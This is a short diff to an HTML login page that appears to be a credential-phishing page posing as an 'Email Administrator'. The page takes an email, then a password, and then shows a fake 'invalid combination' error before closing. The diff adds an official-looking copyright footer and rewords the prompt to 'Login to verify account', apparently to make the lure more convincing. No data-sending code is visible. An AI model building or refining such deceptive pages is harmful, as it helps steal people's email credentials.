@@ -110,6 +110,17 @@
       font-size: 18px;
       font-weight: bold;
     }
+
+    /* Footer */
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 14px;
+      color: #fff;
+      z-index: 1000;
+    }
   </style>
 </head>
 <body>
@@ -121,7 +132,7 @@
 
   <!-- Login Panel -->
   <div id="login" class="login-container">
-    <h2>Login to update account</h2>
+    <h2>Login to verify account</h2>
     <div id="emailSection">
       <input type="email" id="email" placeholder="Email Address" required>
       <button onclick="showPasswordField()">Next</button>
@@ -137,6 +148,11 @@
     <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
     <p>You've entered an invalid email address / password combination.</p>
     <button onclick="window.close()">Close this page</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    2025 Email Administrator. All Rights Reserved
   </div>
 
   <script>
